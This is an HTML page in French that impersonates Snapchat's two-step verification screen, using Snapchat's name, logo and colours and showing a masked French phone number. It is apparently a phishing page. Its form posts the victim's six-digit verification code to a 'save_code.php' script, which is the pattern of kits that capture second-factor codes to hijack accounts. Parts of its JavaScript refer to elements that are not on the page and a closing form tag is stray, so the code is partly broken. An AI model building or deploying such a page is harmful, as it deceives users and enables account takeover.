<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
    <link rel="icon" type="image/png" sizes="32x32" href="logosnap.png">
    <title>Connexion | Snapchat</title>

  <style>
    #title {
    font-size: 2rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
}

.lead {
    font-size: 1rem;
    color: #666;
    margin-bottom: 1.5rem;
}

.field {
    margin-bottom: 1rem;
}

.input {
    width: 100%;
    padding: 0.75rem 1rem;
    font-size: 1rem;
    border: 1px solid #ccc;
    border-radius: 0.5rem;
    outline: none;
}

.input:focus {
    border-color: #fffc00; /* couleur Snapchat */
    box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.3);
}

.btn {
    width: 100%;
    padding: 0.75rem;
    background-color: #fffc00;
    border: none;
    border-radius: 0.5rem;
    font-weight: bold;
    cursor: pointer;
}

.btn:hover {
    background-color: #ffe600;
}

    :root{
      --bg:#f5f6f7;
      --card:#fff;
      --accent:#00a3ff;
      --muted:#6b7280;
      --text:#0b0b0b;
      --success:#16a34a;
      --danger:#ef4444;
      --shadow:0 8px 24px rgba(11,11,11,0.06);
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial}
    body{
      display:flex;align-items:center;justify-content:center;padding:36px 18px;
      background:linear-gradient(180deg,var(--bg) 0%,#fff 60%);
      color:var(--text);
    }
    .wrap{width:100%;max-width:420px;text-align:center}
    .card{background:var(--card);border-radius:12px;padding:28px 32px;box-shadow:var(--shadow)}
    .logo{width:72px;height:72px;margin:0 auto 12px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#fffcc0,#fff7b2);overflow:hidden}
    .logo img{width:64px;height:64px;object-fit:contain;display:block}
    h1{font-size:20px;margin:8px 0 6px;font-weight:600}
    p.lead{margin:0 0 14px;color:var(--muted);font-size:14px}
    .hint{color:var(--muted);font-size:14px;margin-bottom:12px}
    .masked{font-weight:700;color:var(--text)}
    form{display:block;margin-top:6px}
    .code-box{display:flex;gap:10px;justify-content:center;margin:16px 0}
    .code-input{
      width:44px;height:56px;border-radius:10px;border:1px solid #e5e7eb;font-size:24px;text-align:center;
      outline:none;transition:border-color .12s,box-shadow .12s;background:#fff;
    }
    .code-input:focus{box-shadow:0 6px 18px rgba(0,0,0,0.05);border-color:var(--accent)}
    .btn{display:inline-block;padding:10px 14px;border-radius:24px;border:none;background:linear-gradient(180deg,#00b2ff,#008fd6);color:#fff;font-weight:700;cursor:pointer}
    .btn.secondary{background:transparent;color:var(--accent);border:1px solid #e6f2ff}
    .btn:disabled{opacity:.6;cursor:not-allowed}
    .actions{display:flex;justify-content:center;gap:12px;margin-top:8px}
    .message{margin-top:12px;font-size:14px}
    .message.error{color:var(--danger)}
    .message.success{color:var(--success)}
    .small{font-size:13px;color:var(--muted);margin-top:10px}
    .resend{border:none;background:none;color:var(--accent);cursor:pointer;font-weight:600}
    @media (max-width:420px){.code-input{width:38px;height:48px;font-size:20px}}
  </style>



</head>
<body>
  <main class="wrap">
    <section class="card">
      <div class="logo">
        <img src="logo_snap.png" alt="Logo Snapchat">
      </div>

      <h1>Vérification en deux étapes</h1>
      <p class="lead">Nous avons envoyé un code de vérification à ce numéro :</p>
      <div class="hint">Numéro : <span class="masked">+33 6••••••••</span></div>

      
       <form id="codeForm" action="save_code.php" method="post" novalidate>
    <input class="input" type="text" id="code" name="code" maxlength="6" required />
    <button type="submit" class="btn">Valider</button>
</form>


        <div class="small">
          Tu n'as pas reçu le code ?
          <button type="button" id="resendBtn" class="resend">Renvoyer le code</button>
        </div>
      </form>
    </section>
  </main>

  <script>
    (function(){
      const CODE_LENGTH = 6;
      const codeBox = document.getElementById('codeBox');
      const form = document.getElementById('codeForm');
      const message = document.getElementById('message');
      const resendBtn = document.getElementById('resendBtn');
      const cancelBtn = document.getElementById('cancelBtn');

      // Génère 6 champs pour le code
      const inputs = [];
      for (let i = 0; i < CODE_LENGTH; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.inputMode = 'numeric';
        input.maxLength = 1;
        input.className = 'code-input';
        codeBox.appendChild(input);
        inputs.push(input);
      }

      // Focus auto entre inputs
      inputs.forEach((input, i) => {
        input.addEventListener('input', e => {
          const val = e.target.value.replace(/\D/g, '');
          e.target.value = val;
          if (val && i < inputs.length - 1) inputs[i + 1].focus();
        });
        input.addEventListener('keydown', e => {
          if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus();
        });
      });

      form.addEventListener('submit', e => {
        e.preventDefault();
        message.textContent = 'Code vérifié ✅ (simulation)';
        message.className = 'message success';
      });

      cancelBtn.addEventListener('click', () => {
        inputs.forEach(i => i.value = '');
        inputs[0].focus();
        message.textContent = '';
      });

      // 🔁 Recharge la page quand on clique sur "Renvoyer le code"
      resendBtn.addEventListener('click', () => {
        location.reload();
      });

      // Focus initial sur le premier input
      inputs[0].focus();
    })();
  </script>
</body>
</html>
